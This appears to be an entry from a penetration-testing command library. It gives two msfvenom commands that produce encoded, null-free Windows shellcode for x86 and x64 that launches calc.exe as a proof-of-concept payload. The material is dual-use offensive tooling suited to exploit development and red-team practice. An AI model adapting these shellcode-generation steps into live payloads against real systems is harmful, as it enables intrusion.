---
id: 5573ec8b-ce71-4ad0-a14f-982d17dde61c
name: Create default calc payload
type: command
executor: bash
data: 'msfvenom -a x86 -b ''\x00'' --platform windows -p windows/exec cmd=calc.exe
  -e x86/alpha_mixed -f raw EXITFUNC=thread > popcalc.bin

  msfvenom -a x64 -b ''\x00'' --platform windows -p windows/x64/exec cmd=calc.exe
  -e x64/xor -f raw EXITFUNC=thread > popcalc64.bin'
output: null
created_at: '2023-04-06T03:56:23.232564+00:00'
updated_at: '2023-04-10T20:36:50.027825+00:00'
---

# Create default calc payload

```bash
msfvenom -a x86 -b '\x00' --platform windows -p windows/exec cmd=calc.exe -e x86/alpha_mixed -f raw EXITFUNC=thread > popcalc.bin
msfvenom -a x64 -b '\x00' --platform windows -p windows/x64/exec cmd=calc.exe -e x64/xor -f raw EXITFUNC=thread > popcalc64.bin
```
